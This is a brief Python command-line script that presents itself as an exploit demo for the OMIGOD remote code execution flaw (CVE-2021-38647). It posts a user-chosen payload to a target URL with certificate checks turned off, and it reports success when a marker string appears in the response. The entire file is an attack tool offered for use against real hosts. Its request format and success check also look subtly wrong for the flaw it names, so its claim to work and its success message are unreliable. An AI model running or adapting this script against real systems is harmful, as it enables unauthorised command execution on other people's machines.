import argparse
import requests

# OMIGOD Vulnerability Exploitation Demo CLI
# This tool demonstrates exploiting the OMIGOD vulnerability (CVE-2021-38647) by triggering remote code execution.
# Created by milosilo

def exploit_cve_2021_38647(target_url, payload):
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    data = f"POC=poc%0a{payload}"

    response = requests.post(target_url, data=data, headers=headers, verify=False)
    return response

def main():
    parser = argparse.ArgumentParser(description="CVE-2021-38647 Vulnerability Exploitation Demo CLI")
    parser.add_argument("target_url", help="URL of the target system")
    parser.add_argument("payload", help="Payload to trigger the CVE-2021-38647 vulnerability")

    args = parser.parse_args()

    print("Exploiting the CVE-2021-38647 vulnerability...")
    response = exploit_cve_2021_38647(args.target_url, args.payload)

    if response.status_code == 200 and "OMI_NOOP_TRIGGER" in response.text:
        print("CVE-2021-38647 vulnerability exploited successfully. Remote code execution triggered.")
    else:
        print("CVE-2021-38647 exploitation failed.")

if __name__ == "__main__":
    main()
